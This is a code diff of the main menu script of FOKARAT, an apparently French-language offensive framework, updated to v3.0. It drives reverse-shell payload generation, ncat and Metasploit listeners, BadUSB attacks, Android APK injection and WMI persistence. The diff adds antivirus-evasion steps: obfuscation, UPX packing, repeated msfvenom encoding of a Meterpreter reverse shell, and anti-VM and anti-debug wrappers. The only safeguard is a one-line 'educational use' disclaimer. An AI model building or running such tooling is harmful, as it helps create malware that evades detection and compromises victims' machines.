@@ -1,40 +1,68 @@
 #!/usr/bin/env python3
-"""FOKARAT v2.0 - Interface animée"""
+"""
+FOKARAT v3.0 - Framework de cybersécurité
+Interface animée + modules d'évasion antivirus
+Auteur: Lwano Amissi Blanchard (FOKAS)
+"""
 import os
 import sys
 import time
-import random
 
 sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 
+# ─── CORE ────────────────────────────────────────
 from core.config import Config
 from core.logger import Logger
 from core.utils import which
+from core.database import Database
+
+# ─── MODULES PAYLOADS ────────────────────────────
 from modules.payload_generators.python_gen import PythonPayloadGenerator
 from modules.payload_generators.cpp_gen import CppPayloadGenerator
 from modules.payload_generators.msfvenom_gen import MsfvenomGenerator
+
+# ─── MODULES LISTENERS ───────────────────────────
 from modules.listeners.listener_manager import ListenerManager
+
+# ─── MODULES INJECTORS ───────────────────────────
 from modules.injectors.badusb_gen import BadUSBGenerator
 from modules.injectors.duck_encoder import DuckEncoder
 from modules.injectors.usb_flasher import USBFlasher
 from modules.injectors.http_server import HTTPServer
+
+# ─── MODULES ATTAQUES ────────────────────────────
 from modules.android.apk_injector import ApkInjector
 from modules.persistence.wmi_persist import WMIPersistence
+
+# ─── MODULES ÉVASION ─────────────────────────────
+from modules.evasion.payload_padding import PaddingGenerator
+from modules.evasion.python_obfuscator import PythonObfuscator
+from modules.evasion.upx_packer import UPXPacker
+from modules.evasion.multi_encoder import MultiEncoder
+from modules.evasion.anti_vm import AntiVMGenerator
+from modules.evasion.anti_debug import AntiDebugGenerator
+
+# ─── IA ──────────────────────────────────────────
 from ai.assistant import Assistant
 
+
+# ══════════════════════════════════════════════════
+#  INITIALISATION
+# ══════════════════════════════════════════════════
 logger = Logger()
 config = Config()
 listener = ListenerManager()
 http_server = HTTPServer()
+db = Database()
 
 
 # ══════════════════════════════════════════════════
 #  COULEURS ANSI
 # ══════════════════════════════════════════════════
 class C:
-    R = "\033[0m"       # Reset
-    B = "\033[1m"       # Bold
-    D = "\033[2m"       # Dim
+    R = "\033[0m"
+    B = "\033[1m"
+    D = "\033[2m"
     RED = "\033[91m"
     GRN = "\033[92m"
     YEL = "\033[93m"
@@ -43,6 +71,7 @@ class C:
     CYN = "\033[96m"
     WHT = "\033[97m"
     OR = "\033[38;5;208m"
+    PNK = "\033[38;5;213m"
 
 
 # ══════════════════════════════════════════════════
@@ -51,22 +80,25 @@ class C:
 BANNER = f"""{C.GRN}{C.B}
    ███████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ████████╗
    ██╔════╝██╔═══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝
-   █████╗  ██║   ██║█████╔╝ ███████║██████╔╝███████║   ██║   
-   ██╔══╝  ██║   ██║██╔═██╗ ██╔══██║██╔══██╗██╔══██║   ██║   
-   ██║     ╚██████╔╝██║  ██╗██║  ██║██║  ██║██║  ██║   ██║   
+   █████╗  ██║   ██║█████╔╝ ███████║██████╔╝███████║   ██║
+   ██╔══╝  ██║   ██║██╔═██╗ ██╔══██║██╔══██╗██╔══██║   ██║
+   ██║     ╚██████╔╝██║  ██╗██║  ██║██║  ██║██║  ██║   ██║
    ╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   {C.R}
 {C.CYN}{C.B}              Building the future, one tool at a time.{C.R}
-{C.YEL}                       FOKARAT Framework v2.0{C.R}
+{C.YEL}                    FOKARAT Framework v3.0{C.R}
 """
 
+
 BOOT_SEQUENCE = [
-    ("[BOOT 01] Initialisation du noyau FOKARAT...", 0.15),
-    ("[BOOT 02] Chargement des modules payloads...", 0.15),
-    ("[BOOT 03] Chargement des listeners...", 0.15),
-    ("[BOOT 04] Chargement des modules Android...", 0.15),
-    ("[BOOT 05] Chargement de l'assistant IA...", 0.15),
-    ("[BOOT 06] Vérification des dépendances...", 0.20),
-    ("[BOOT 07] Système prêt pour la session.", 0.30),
+    ("[BOOT 01] Initialisation du noyau FOKARAT...", 0.10),
+    ("[BOOT 02] Chargement des modules payloads...", 0.10),
+    ("[BOOT 03] Chargement des listeners...", 0.10),
+    ("[BOOT 04] Chargement des modules Android...", 0.10),
+    ("[BOOT 05] Chargement des modules d'évasion...", 0.10),
+    ("[BOOT 06] Initialisation de la base de données...", 0.10),
+    ("[BOOT 07] Chargement de l'assistant IA...", 0.10),
+    ("[BOOT 08] Vérification des dépendances...", 0.15),
+    ("[BOOT 09] Système prêt pour la session.", 0.25),
 ]
 
 
@@ -78,7 +110,6 @@ def clear():
 
 
 def typewriter(text, delay=0.008, color=C.WHT):
-    """Effet machine à écrire."""
     for char in text:
         sys.stdout.write(f"{color}{char}{C.R}")
         sys.stdout.flush()
@@ -87,7 +118,6 @@ def typewriter(text, delay=0.008, color=C.WHT):
 
 
 def spinner(duration=0.6, message="Chargement", color=C.CYN):
-    """Affiche un spinner animé."""
     frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
     end = time.time() + duration
     i = 0
@@ -96,11 +126,10 @@ def spinner(duration=0.6, message="Chargement", color=C.CYN):
         sys.stdout.flush()
         time.sleep(0.06)
         i += 1
-    sys.stdout.write("\r" + " " * (len(message) + 10) + "\r")
+    sys.stdout.write("\r" + " " * (len(message) + 15) + "\r")
 
 
 def progress_bar(duration=0.8, width=40, color=C.GRN):
-    """Barre de progression animée."""
     sys.stdout.write("  ")
     for i in range(width + 1):
         pct = int(i / width * 100)
@@ -113,10 +142,10 @@ def progress_bar(duration=0.8, width=40, color=C.GRN):
 
 
 def boot_animation():
-    """Animation de démarrage complète."""
     clear()
+    print()
     for msg, delay in BOOT_SEQUENCE:
-        typewriter(f"  {C.YEL}{msg}{C.R}", delay=0.004)
+        typewriter(f"  {C.YEL}{msg}{C.R}", delay=0.003)
         time.sleep(delay)
     print()
     progress_bar(0.6, 50, C.CYN)
@@ -124,18 +153,14 @@ def boot_animation():
 
 
 def animated_banner():
-    """Bannière avec effet d'apparition."""
     clear()
     print()
     for line in BANNER.split("\n"):
         print(f"  {line}")
-        time.sleep(0.03)
+        time.sleep(0.02)
     print()
 
 
-# ══════════════════════════════════════════════════
-#  MENU PRINCIPAL STYLÉ
-# ══════════════════════════════════════════════════
 def separator(char="═", length=62, color=C.CYN):
     return f"{color}{char * length}{C.R}"
 
@@ -144,6 +169,9 @@ def menu_option(key, label, color=C.WHT):
     return f"  {C.YEL}│{C.R}  {C.GRN}[{key}]{C.R}  {color}{label}{C.R}"
 
 
+# ══════════════════════════════════════════════════
+#  MENU PRINCIPAL
+# ══════════════════════════════════════════════════
 def show_menu():
     clear()
     animated_banner()
@@ -159,7 +187,7 @@ def show_menu():
 
     print(separator("═", 62, C.CYN))
 
-    # Section Payloads
+    # ─── PAYLOADS ──────────────────────────────
     print(f"  {C.B}{C.MAG}▶ PAYLOADS{C.R}")
     print(menu_option("01", "Payload Python (reverse shell)"))
     print(menu_option("02", "Payload C++ (Mingw)"))
@@ -167,7 +195,7 @@ def show_menu():
 
     print(separator("─", 62, C.BLU))
 
-    # Section Listeners
+    # ─── LISTENERS ─────────────────────────────
     print(f"  {C.B}{C.MAG}▶ LISTENERS{C.R}")
     print(menu_option("04", "Listener ncat"))
     print(menu_option("05", "Listener Metasploit"))
@@ -176,28 +204,41 @@ def show_menu():
 
     print(separator("─", 62, C.BLU))
 
-    # Section BadUSB
+    # ─── BADUSB ────────────────────────────────
     print(f"  {C.B}{C.MAG}▶ BADUSB{C.R}")
     print(menu_option("08", "Générer DuckyScript (5 types d'attaques)"))
     print(menu_option("09", "Encoder .duck → .bin"))
-    print(menu_option("10", "Flasher sur matériel USB (Digispark / Pico / Ducky)"))
+    print(menu_option("10", "Flasher sur matériel USB"))
 
     print(separator("─", 62, C.BLU))
 
-    # Section Attaques
+    # ─── ATTAQUES ──────────────────────────────
     print(f"  {C.B}{C.MAG}▶ ATTAQUES{C.R}")
     print(menu_option("11", "APK Injector (Android)"))
     print(menu_option("12", "Persistance WMI (Windows)"))
 
     print(separator("─", 62, C.BLU))
 
-    # Section Divers
+    # ─── ÉVASION ANTIVIRUS ─────────────────────
+    print(f"  {C.B}{C.RED}▶ ÉVASION ANTIVIRUS{C.R}")
+    print(menu_option("20", "Appliquer padding aléatoire (C++)"))
+    print(menu_option("21", "Obfusquer payload Python"))
+    print(menu_option("22", "Compresser binaire avec UPX"))
+    print(menu_option("23", "Multi-encodage MSFVenom"))
+    print(menu_option("24", "Ajouter protection Anti-VM"))
+    print(menu_option("25", "Ajouter protection Anti-Debug"))
+
+    print(separator("─", 62, C.BLU))
+
+    # ─── DIVERS ────────────────────────────────
     print(f"  {C.B}{C.MAG}▶ DIVERS{C.R}")
     print(menu_option("13", "Assistant IA local"))
     print(menu_option("14", "Configuration LHOST / LPORT"))
     print(menu_option("15", "Sauvegarder la config"))
     print(menu_option("16", "Ouvrir msfconsole"))
     print(menu_option("17", "Vérifier les dépendances"))
+    print(menu_option("26", "Voir le rapport d'opérations"))
+    print(menu_option("27", "Lancer l'API Web (port 5000)"))
     print(menu_option("18", "Crédits"))
     print(menu_option("19", "Quitter", C.RED))
 
@@ -227,12 +268,13 @@ def check_dependencies():
         "zipalign": "Alignement APK",
         "keytool": "Gestion keystore",
         "java": "Java Runtime",
+        "upx": "Compression UPX",
         "pyinstaller": "Compil Python → exe",
     }
 
     missing = []
     for cmd, desc in deps.items():
-        spinner(0.15, f"Vérification de {cmd}")
+        spinner(0.10, f"Vérification de {cmd}")
         if which(cmd):
             print(f"  {C.GRN}[✓]{C.R} {C.B}{cmd:<28}{C.R} {C.D}{desc}{C.R}")
         else:
@@ -243,15 +285,141 @@ def check_dependencies():
     if missing:
         logger.warning(f"{len(missing)} outil(s) manquant(s).")
         print(f"\n  {C.YEL}Installation :{C.R}")
-        print(f"    {C.CYN}sudo apt install python3 python3-pip git g++ mingw-w64 ncat apktool default-jdk zipalign binutils-avr{C.R}")
-        print(f"    {C.CYN}pip install pyinstaller llama-cpp-python{C.R}")
+        print(f"    {C.CYN}sudo apt install python3 python3-pip git g++ mingw-w64 ncat \\")
+        print(f"        apktool default-jdk zipalign binutils-avr upx-ucl{C.R}")
+        print(f"    {C.CYN}pip install pyinstaller llama-cpp-python fastapi uvicorn{C.R}")
     else:
         logger.success("Toutes les dépendances sont présentes !")
     input(f"\n  {C.D}[Entrée] pour continuer...{C.R}")
 
 
 # ══════════════════════════════════════════════════
-#  MENU PRINCIPAL
+#  GESTIONNAIRES DES MODULES D'ÉVASION
+# ══════════════════════════════════════════════════
+def handle_padding():
+    path = input(f"  {C.YEL}Chemin du fichier .c à protéger :{C.R} ").strip()
+    if not path or not os.path.exists(path):
+        logger.error("Fichier introuvable.")
+        return
+    with open(path, "r", encoding="utf-8") as f:
+        code = f.read()
+    gen = PaddingGenerator()
+    wrapped = gen.wrap_payload(code, size_kb=8, fake_funcs=15)
+    out = path.replace(".c", "_protected.c")
+    with open(out, "w", encoding="utf-8") as f:
+        f.write(wrapped)
+    logger.success(f"Payload protégé : {out}")
+    db.log_payload("padding_cpp", "-", 0, out, "success")
+
+
+def handle_python_obfuscation():
+    path = input(f"  {C.YEL}Chemin du fichier .py à obfusquer :{C.R} ").strip()
+    if not path or not os.path.exists(path):
+        logger.error("Fichier introuvable.")
+        return
+    with open(path, "r", encoding="utf-8") as f:
+        code = f.read()
+    obs = PythonObfuscator().obfuscate(code)
+    out = path.replace(".py", "_obf.py")
+    with open(out, "w", encoding="utf-8") as f:
+        f.write(obs)
+    logger.success(f"Payload obfusqué : {out}")
+    db.log_payload("obfuscated_python", "-", 0, out, "success")
+
+
+def handle_upx():
+    path = input(f"  {C.YEL}Chemin du binaire à compresser :{C.R} ").strip()
+    if not path or not os.path.exists(path):
+        logger.error("Binaire introuvable.")
+        return
+    packer = UPXPacker()
+    result = packer.pack(path, ultra=True)
+    db.log_payload("upx_packed", "-", 0, result, "success")
+
+
+def handle_multi_encoder():
+    enc = MultiEncoder()
+    enc.list_encoders()
+    key = input(f"  {C.YEL}Choix de l'encodeur [1] :{C.R} ").strip() or "1"
+
+    lhost = input(f"  {C.YEL}LHOST :{C.R} ").strip()
+    if not lhost:
+        logger.error("LHOST obligatoire.")
+        return
+    try:
+        lport = int(input(f"  {C.YEL}LPORT :{C.R} ").strip())
+    except ValueError:
+        logger.error("LPORT invalide.")
+        return
+
+    try:
+        iters = int(input(f"  {C.YEL}Itérations [5] :{C.R} ").strip() or "5")
+    except ValueError:
+        iters = 5
+
+    out_dir = config.get("output_dir", "output")
+    os.makedirs(out_dir, exist_ok=True)
+    out = os.path.join(out_dir, f"payload_encoded_{key}.exe")
+
+    result = enc.encode(
+        "windows/meterpreter/reverse_tcp",
+        lhost, lport, out, key, iterations=iters
+    )
+    if result:
+        db.log_payload("multi_encoded", lhost, lport, result, "success")
+
+
+def handle_anti_vm():
+    path = input(f"  {C.YEL}Chemin du .c :{C.R} ").strip()
+    if not path or not os.path.exists(path):
+        logger.error("Fichier introuvable.")
+        return
+    with open(path, "r", encoding="utf-8") as f:
+        code = f.read()
+    wrapped = AntiVMGenerator().wrap_with_anti_vm(code)
+    out = path.replace(".c", "_antivm.c")
+    with open(out, "w", encoding="utf-8") as f:
+        f.write(wrapped)
+    logger.success(f"Protection Anti-VM ajoutée : {out}")
+
+
+def handle_anti_debug():
+    path = input(f"  {C.YEL}Chemin du .c :{C.R} ").strip()
+    if not path or not os.path.exists(path):
+        logger.error("Fichier introuvable.")
+        return
+    with open(path, "r", encoding="utf-8") as f:
+        code = f.read()
+    wrapped = AntiDebugGenerator().wrap(code)
+    out = path.replace(".c", "_antidbg.c")
+    with open(out, "w", encoding="utf-8") as f:
+        f.write(wrapped)
+    logger.success(f"Protection Anti-Debug ajoutée : {out}")
+
+
+def handle_report():
+    path = db.export_report()
+    print(f"\n  {C.GRN}Rapport généré : {path}{C.R}\n")
+    try:
+        with open(path, "r", encoding="utf-8") as f:
+            print(f.read())
+    except Exception as e:
+        logger.error(f"Lecture impossible : {e}")
+
+
+def handle_web_api():
+    logger.info("Démarrage de l'API Web sur le port 5000...")
+    logger.info("Ouvrez : http://localhost:5000/docs")
+    try:
+        from web.api import start_web
+        start_web()
+    except ImportError as e:
+        logger.error(f"FastAPI/Uvicorn non installé : {e}")
+        logger.info("pip install fastapi uvicorn")
+
+
+# ══════════════════════════════════════════════════
+#  BOUCLE PRINCIPALE
 # ══════════════════════════════════════════════════
 def main():
     boot_animation()
@@ -262,52 +430,75 @@ def main():
         choice = input(f"  {C.B}{C.MAG}╰─▶{C.R} {C.B}FOKARAT{C.R} {C.YEL}>{C.R} ").strip()
 
         try:
-            # PAYLOADS
+            # ─── PAYLOADS ──────────────────────
             if choice == "01":
-                spinner(0.4, "Préparation du module Python")
-                PythonPayloadGenerator().run(config)
-            elif choice == "02":
-                spinner(0.4, "Préparation du module C++")
-                CppPayloadGenerator().run(config)
-            elif choice == "03":
-                spinner(0.4, "Préparation de MSFVenom")
-                MsfvenomGenerator().run(config)
+                spinner(0.3, "Préparation du module Python")
+                result = PythonPayloadGenerator().run(config)
+                if result.get("status") == "success":
+                    db.log_payload("python", config.get("lhost"), config.get("lport"),
+                                   result.get("payload_path"), "success")
 
-            # LISTENERS
+            elif choice == "02":
+                spinner(0.3, "Préparation du module C++")
+                result = CppPayloadGenerator().run(config)
+                if result.get("status") == "success":
+                    db.log_payload("cpp", config.get("lhost"), config.get("lport"),
+                                   result.get("payload_path"), "success")
+
+            elif choice == "03":
+                spinner(0.3, "Préparation de MSFVenom")
+                result = MsfvenomGenerator().run(config)
+                if result.get("status") == "success":
+                    db.log_payload("msfvenom", config.get("lhost"), config.get("lport"),
+                                   result.get("payload_path"), "success")
+
+            # ─── LISTENERS ─────────────────────
             elif choice == "04":
                 spinner(0.3, "Démarrage ncat")
                 listener.start_ncat(config)
+                db.log_listener("ncat", config.get("lhost"), config.get("lport"), "-", "running")
+
             elif choice == "05":
                 spinner(0.3, "Démarrage Metasploit")
                 listener.start_msf(config)
+                db.log_listener("msf", config.get("lhost"), config.get("lport"), "-", "running")
+
             elif choice == "06":
                 listener.stop_all()
+
             elif choice == "07":
                 http_server.run(config)
                 continue
 
-            # BADUSB
+            # ─── BADUSB ────────────────────────
             elif choice == "08":
                 spinner(0.3, "Préparation DuckyScript")
                 BadUSBGenerator().run(config)
+
             elif choice == "09":
                 DuckEncoder().run(config)
+
             elif choice == "10":
                 USBFlasher().run(config)
 
-            # ATTAQUES
+            # ─── ATTAQUES ──────────────────────
             elif choice == "11":
                 spinner(0.4, "Préparation APK Injector")
-                ApkInjector().run(config)
+                result = ApkInjector().run(config)
+                if result.get("status") == "success":
+                    db.log_payload("apk_injected", result.get("lhost"),
+                                   result.get("lport"), result.get("apk_path"), "success")
+
             elif choice == "12":
                 WMIPersistence().run(config)
 
-            # DIVERS
+            # ─── DIVERS ────────────────────────
             elif choice == "13":
                 q = input(f"  {C.CYN}Question >{C.R} ").strip()
                 print()
                 spinner(0.5, "Réflexion de l'IA")
                 print(Assistant(config.get("llm_model_path")).chat(q))
+
             elif choice == "14":
                 print()
                 new_ip = input(f"  {C.YEL}Nouveau LHOST [{config.get('lhost')}]{C.R} : ").strip()
@@ -318,29 +509,34 @@ def main():
                     config.set("lport", int(new_port))
                 spinner(0.3, "Mise à jour")
                 logger.success("Configuration mise à jour.")
+
             elif choice == "15":
                 spinner(0.3, "Sauvegarde")
                 if config.save():
                     logger.success("Config sauvegardée dans config.yaml")
+
             elif choice == "16":
                 if which("msfconsole"):
                     spinner(0.4, "Ouverture de msfconsole")
                     os.system("msfconsole")
                 else:
                     logger.error("msfconsole absent.")
+
             elif choice == "17":
                 check_dependencies()
                 continue
+
             elif choice == "18":
                 clear()
                 animated_banner()
-                print(f"  {C.B}{C.GRN}FOKARAT v2.0{C.R}")
+                print(f"  {C.B}{C.GRN}FOKARAT v3.0{C.R}")
                 print(f"  {C.WHT}Auteur  :{C.R} Lwano Amissi Blanchard (FOKAS)")
                 print(f"  {C.WHT}Email   :{C.R} amissilwano5@gmail.com")
                 print(f"  {C.WHT}GitHub  :{C.R} github.com/amissilwano5-beep")
                 print(f"  {C.WHT}Ville   :{C.R} Bukavu, RDC")
                 print()
                 print(f"  {C.YEL}⚠  Usage éducatif et tests autorisés uniquement.{C.R}")
+
             elif choice == "19":
                 print()
                 spinner(0.5, "Arrêt des services")
@@ -348,6 +544,33 @@ def main():
                 typewriter(f"\n  {C.GRN}Merci d'avoir utilisé FOKARAT. À bientôt !{C.R}", delay=0.02)
                 print()
                 break
+
+            # ─── ÉVASION ANTIVIRUS ─────────────
+            elif choice == "20":
+                handle_padding()
+
+            elif choice == "21":
+                handle_python_obfuscation()
+
+            elif choice == "22":
+                handle_upx()
+
+            elif choice == "23":
+                handle_multi_encoder()
+
+            elif choice == "24":
+                handle_anti_vm()
+
+            elif choice == "25":
+                handle_anti_debug()
+
+            elif choice == "26":
+                handle_report()
+
+            elif choice == "27":
+                handle_web_api()
+                continue
+
             else:
                 logger.warning("Choix invalide.")
 
